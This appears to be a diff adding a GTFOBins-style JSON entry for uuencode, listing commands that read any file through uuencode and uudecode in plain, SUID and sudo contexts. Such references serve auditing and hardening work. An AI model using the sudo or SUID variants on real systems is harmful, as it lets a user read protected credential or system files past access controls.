@@ -1,0 +1,19 @@
+{
+	"functions": {
+		"file-read": [
+			{
+				"code": "uuencode \"[file]\" /dev/stdout | uudecode\n"
+			}
+		],
+		"suid": [
+			{
+				"code": "uuencode \"[file]\" /dev/stdout | uudecode\n"
+			}
+		],
+		"sudo": [
+			{
+				"code": "sudo uuencode \"[file]\" /dev/stdout | uudecode\n"
+			}
+		]
+	}
+}
